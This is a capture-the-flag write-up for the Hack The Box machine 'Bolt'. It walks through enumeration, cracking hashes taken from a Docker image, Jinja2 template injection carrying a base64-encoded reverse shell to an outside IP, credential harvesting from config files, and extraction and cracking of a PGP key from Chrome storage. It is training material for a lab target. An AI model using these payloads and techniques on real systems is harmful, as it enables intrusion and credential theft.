> Author: **[d4rkpayl0ad][author-profile]**

## Discovery

### Port scanning

```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2021-02-24T19:11:23
|_Not valid after:  2022-02-24T19:11:23
823/tcp   filtered unknown
2972/tcp  filtered pmsm-webrctl
3032/tcp  filtered redwood-chat
6340/tcp  filtered unknown
6773/tcp  filtered unknown
8102/tcp  filtered kz-migr
17147/tcp filtered unknown
24096/tcp filtered unknown
26590/tcp filtered unknown
27224/tcp filtered unknown
30519/tcp filtered unknown
32710/tcp filtered unknown
33774/tcp filtered unknown
47686/tcp filtered unknown
55595/tcp filtered unknown
57182/tcp filtered unknown
57574/tcp filtered unknown
62571/tcp filtered unknown
63959/tcp filtered unknown
```

### Vhost enumeration

```bash
gobuster vhost --domain bolt.htb --append-domain -w /usr/share/wordlists/discovery/subdomains-top1million-20000.txt -u http://10.10.11.114
# Found: mail.bolt.htb (Status: 200) [Size: 4943]
# Found: demo.bolt.htb (Status: 302) [Size: 219]
```

### Directory enumeration

```bash
gobuster dir -u http://bolt.htb -w /usr/share/wordlists/discovery/raft-large-directories-lowercase.txt
# /contact              (Status: 200) [Size: 26293]
# /logout               (Status: 302) [Size: 209] [--> http://10.10.11.114/]
# /register             (Status: 200) [Size: 11038]
# /download             (Status: 200) [Size: 18570]
# /login                (Status: 200) [Size: 9287]
# /services             (Status: 200) [Size: 22443]
# /profile              (Status: 500) [Size: 290]
# /index                (Status: 308) [Size: 247] [--> http://10.10.11.114/]
# /pricing              (Status: 200) [Size: 31731]
# /sign-up              (Status: 200) [Size: 11038]
# /sign-in              (Status: 200) [Size: 9287]
# /check-email          (Status: 200) [Size: 7331]
```

The subdomains respond with status 200 to all requests, they require custom filters:

```bash
ffuf -c -v -o discovery/directories.mail.bolt.htb \
    -w /usr/share/wordlists/discovery/raft-medium-directories-lowercase.txt \
    -u http://mail.bolt.htb/FUZZ -mc all -fw 345
python -m json.tool discovery/directories.mail.bolt.htb |
    perl -ne 'm#"url":\s*"http://mail.bolt.htb/(.+)",#g && print $1."\n"'
# plugins
# bin
# temp
# logs
# config
# skins
# public_html
# installer
# program
# vendor
ffuf -c -v -o discovery/directories.demo.bolt.htb \
    -w /usr/share/wordlists/discovery/raft-medium-directories-lowercase.txt \
    -u http://demo.bolt.htb/FUZZ -mc all -fw 1218
python -m json.tool discovery/directories.demo.bolt.htb |
    perl -ne 'm#"url":\s*"http://demo.bolt.htb/(.+)",#g && print $1."\n"'
# logout
# register
# login
ffuf -c -v -o discovery/directories.passbolt.bolt.htb \
    -w /usr/share/wordlists/discovery/raft-medium-directories-lowercase.txt \
    -u http://passbolt.bolt.htb/FUZZ -mc all -fw 775
python -m json.tool discovery/directories.passbolt.bolt.htb |
    perl -ne 'm#"url":\s*"https://passbolt.bolt.htb/(.+)",#g && print $1."\n"'
# logout
# js
# login
# css
# img
# register
# app
# users
# resources
# fonts
# groups
# settings
# locales
# healthcheck
# recover
# roles
```

### Browsing the webserver

The website is mostly empty / not responding, apart from the pages `/login`
and `/download`.

The default / random credentials don't work on the login page and it's not
possible to register a new account.

On the download page there's a docker image.

## Cracking the web UI password

The Docker image hosts a web app that may have shared credentials.

The app files are scattered between the Docker image layers. The goal is to
find the database credentials and data.

So we extract all the layers and look for the Flask sources:

```bash
find image/ -type f -name '*.py' | grep -iav site-packages | grep -iav 'usr/lib'
# image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/home/__init__.py
# image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/home/forms.py
# image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/home/routes.py
# image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/__init__.py
# image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/util.py
# image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/__init__.py
# image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/forms.py
# image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py
# image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/models.py
# image/3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/app/base/.wh.routes.py
# image/3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/app/base/.wh.forms.py
# image/745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/config.py
# image/745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/gunicorn-cfg.py
# image/745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/run.py
# image/2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/app/base/forms.py
# image/2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/app/base/routes.py
```

And the Flask config holds:

```python
# PostgreSQL database
SQLALCHEMY_DATABASE_URI = '{}://{}:{}@{}:{}/{}'.format(
    config( 'DB_ENGINE'   , default='postgresql'    ),
    config( 'DB_USERNAME' , default='appseed'       ),
    config( 'DB_PASS'     , default='pass'          ),
    config( 'DB_HOST'     , default='localhost'     ),
    config( 'DB_PORT'     , default=5432            ),
    config( 'DB_NAME'     , default='appseed-flask' )
)
```

Next hunt for the data store files:

```bash
find image/ -type f -name 'db.sqlite3'
# image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3
```

And this DB has some admin credentials in the User table:

```bash
sqlite3 image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3 'select * from User' 
# 1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||
```

This is a MD5 hash:

```bash
hashcat -m 2600 -a 0 admin.hash /usr/share/wordlists/passwords/rockyou-50.txt
```

> admin deadbolt

This allows to connect to the dashboard AdminLTE, at `http://bolt.htb/login/`.
Still this service has no useful CVEs nor data...

## Break-in

The register page works only on `demo.bolt.htb` but the user is created across
subdomains. The server asks for an invitation code, which can be found in
the Docker image:

```python
@blueprint.route('/register', methods=['GET', 'POST'])
def register():
    login_form = LoginForm(request.form)
    create_account_form = CreateAccountForm(request.form)
    if 'register' in request.form:

        username  = request.form['username']
        email     = request.form['email'   ]
        code      = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':
```

Then it is possible to login on `demo.bolt.htb` and `mail.bolt.htb`.

The webmail is:

![][webmail-version]

Also the changes made to the profile on `demo.bolt.htb` are reflected in the
confirmation mail. Entering `{{ 7 * 7 }}` as the new user name results in:

![][webmail-ssti]

And the templates are rendered with Jinja2: let's try the [snippets from hacktricks][hacktricks-ssti].

```
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMy85OTk5IDA+JjE= | base64 -d | bash")["read"]() %} a {% endwith %}
```

Finally a shell!

## Moving

```bash
find . -type f -name '*sqlite*'
# ./roundcube/program/lib/Roundcube/db/sqlite.php
# ./roundcube/SQL/sqlite.initial.sql
find . -type f -name '*config*'
# ./demo/config.py
# ./demo/static/assets/plugins/raphael/webpack.config.js
# ./demo/static/assets/img/favicon/browserconfig.xml
# ./dev/config.py
# ./dev/static/assets/plugins/raphael/webpack.config.js
# ./dev/static/assets/img/favicon/browserconfig.xml
# ./roundcube/plugins/enigma/config.inc.php.dist
# ./roundcube/plugins/password/config.inc.php.dist
# ./roundcube/plugins/http_authentication/config.inc.php.dist
# ./roundcube/plugins/markasjunk/config.inc.php.dist
# ./roundcube/plugins/managesieve/config.inc.php.dist
# ./roundcube/plugins/redundant_attachments/config.inc.php.dist
# ./roundcube/plugins/acl/config.inc.php.dist
# ./roundcube/plugins/emoticons/config.inc.php.dist
# ./roundcube/plugins/newmail_notifier/config.inc.php.dist
# ./roundcube/plugins/krb_authentication/config.inc.php.dist
# ./roundcube/plugins/database_attachments/config.inc.php.dist
# ./roundcube/plugins/jqueryui/config.inc.php.dist
# ./roundcube/plugins/additional_message_headers/config.inc.php.dist
# ./roundcube/plugins/squirrelmail_usercopy/config.inc.php.dist
# ./roundcube/plugins/new_user_identity/config.inc.php.dist
# ./roundcube/plugins/zipdownload/config.inc.php.dist
# ./roundcube/plugins/help/config.inc.php.dist
# ./roundcube/program/lib/Roundcube/rcube_config.php
# ./roundcube/installer/config.php
# ./roundcube/vendor/kolab/net_ldap3/.arcconfig
# ./roundcube/config/config.inc.php.sample
# ./roundcube/config/config.inc.php
cat dev/config.py 
# """Flask Configuration"""
# #SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'
# SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'
# SQLALCHEMY_TRACK_MODIFICATIONS = True
# SECRET_KEY = 'kreepandcybergeek'
# MAIL_SERVER = 'localhost'
# MAIL_PORT = 25
# MAIL_USE_TLS = False
# MAIL_USE_SSL = False
# #MAIL_DEBUG = app.debug
# MAIL_USERNAME = None
# MAIL_PASSWORD = None
# DEFAULT_MAIL_SENDER = 'support@bolt.htb'
mysql -D'boltmail' -u'bolt_dba' -p'dXUUHSW9vBpH5qRB' -e'select * from user;'
# id  username    password    email   host_header ip_address  email_confirmed profile_confirm profile_update
# 1   admin   $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.  admin@bolt.htb  NULL    NULL    1   NULL    NULL
cat /etc/passwd | grep -viaE '(nologin|bin/false)'
# root:x:0:0:root:/root:/bin/bash
# sync:x:4:65534:sync:/bin:/bin/sync
# eddie:x:1000:1000:Eddie Johnson,,,:/home/eddie:/bin/bash
# clark:x:1001:1001:Clark Griswold,,,:/home/clark:/bin/bash
cat roundcube/config/config.inc.php
# $config['db_dsnw'] = 'mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube';
# $config['des_key'] = 'tdqy62YPNdGEeohXtJ2160bX';
# $config['product_name'] = 'Bolt Webmail';
mysql -D'roundcube' -u'roundcubeuser' -p'WXg5He2wHt4QYHuyGET' -e'select * from users;'
# +---------+----------+-----------+---------------------+---------------------+--------------+----------------------+----------+---------------------------------------------------+
# | user_id | username | mail_host | created             | last_login          | failed_login | failed_login_counter | language | preferences                                       |
# +---------+----------+-----------+---------------------+---------------------+--------------+----------------------+----------+---------------------------------------------------+
# |       4 | text     | localhost | 2021-10-05 00:25:39 | 2021-10-05 00:25:39 | NULL         |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"PFUWxooCaFsAxdJa";} |
# |       5 | apehex   | localhost | 2021-10-05 02:57:01 | 2021-10-05 02:57:01 | NULL         |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"J4zq37Fp4CXNMRhw";} |
# +---------+----------+-----------+---------------------+---------------------+--------------+----------------------+----------+---------------------------------------------------+
cat /etc/passbolt/passbolt.php
# // Database configuration.
# 'Datasources' => [
#     'default' => [
#         'host' => 'localhost',
#         'port' => '3306',
#         'username' => 'passbolt',
#         'password' => 'rT2;jW7<eY8!dX8}pQ8%',
#         'database' => 'passboltdb',
```

The last password works with eddie's account:

> eddie rT2;jW7<eY8!dX8}pQ8%

## Escalation

While browsing as `www-data` I located `/var/mail/eddie`; we can now read it:

```
From clark@bolt.htb  Thu Feb 25 14:20:19 2021
Return-Path: <clark@bolt.htb>
X-Original-To: eddie@bolt.htb
Delivered-To: eddie@bolt.htb
Received: by bolt.htb (Postfix, from userid 1001)
        id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
Subject: Important!
To: <eddie@bolt.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20210225212019.DFF264CD@bolt.htb>
Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
From: Clark Griswold <clark@bolt.htb>

Hey Eddie,

The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.
Once you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...

-Clark
```

### Searching by name

Looking for files named `*.bak` or the like:

```bash
find / -user eddie -type f -size -1M \
    \( -name '*.bak' -o -name '*.old' -o -name '*backup*' -o -path '*backup*' \) 2>/dev/null
# /home/eddie/.config/google-chrome/Default/Feature Engagement Tracker/AvailabilityDB/LOG.old
# /home/eddie/.config/google-chrome/Default/Feature Engagement Tracker/EventDB/LOG.old
# /home/eddie/.config/google-chrome/Default/BudgetDatabase/LOG.old
# /home/eddie/.config/google-chrome/Default/LOG.old
# /home/eddie/.config/google-chrome/Default/AutofillStrikeDatabase/LOG.old
```

### Searching by entropy

At first I thought about filtering files according to their entropy:

```bash
find / -user eddie -type f -size -1M -exec ent
```

### Searching by date

I was about to remove the mail header when I noticed the date:

```bash
find / -newermt 2021-02-24 ! -newermt 2021-02-27 \
    -type f -user eddie -readable \
    -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null
```

This returns a lot of interesting results:

- `/home/eddie/.gnupg/pubring.kbx`: a password manager DB
- Chrome

Unlike other boxes this one is equiped with X11: I was surprised to see the folders
`Desktop` and the like in the home directory.

What's more having Chrome installed is most uncommon: I'm sure some login is
saved inside Chrome's profile.

```bash
cat /etc/ssh/sshd_config | grep -ia x11
# X11Forwarding yes
# #X11DisplayOffset 10
# #X11UseLocalhost yes
# #   X11Forwarding no
ssh -X eddie@10.10.11.114
google-chrome
```

So the login page still asks for a password. Let's hunt for DB / passwords / keys:

```bash
grep -Hoar 'PRIVATE KEY' .
# .config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log:PRIVATE KEY
perl -ne 'm#(-----BEGIN PGP PRIVATE KEY BLOCK-----.+?-----END PGP PRIVATE KEY BLOCK-----)#g && print $1."\n"' \
    '.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log' |
    perl -pe 's#\\\\r\\\\n#\n#g' > eddie.key
```

```
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

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
PSwYYWlAywj5=cqxZ
-----END PGP PRIVATE KEY BLOCK-----
```

Then crack it to get the password:

```bash
gpg2john eddie.key > eddie.key.hash
john -w /usr/share/wordlists/passwords/rockyou.txt --format=gpg eddie.key.hash
```

> merrychristmas

With this we can finally access Passbolt and read the stored credentials:

> Z(2rmxsNW(Z?3=p/9s

[author-profile]: https://app.hackthebox.eu/users/168546
[hacktricks-ssti]: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python

[passbolt-version]: images/passbolt-version.png
[webmail-ssti]: images/webmail-ssti.png
[webmail-version]: images/webmail-version.png
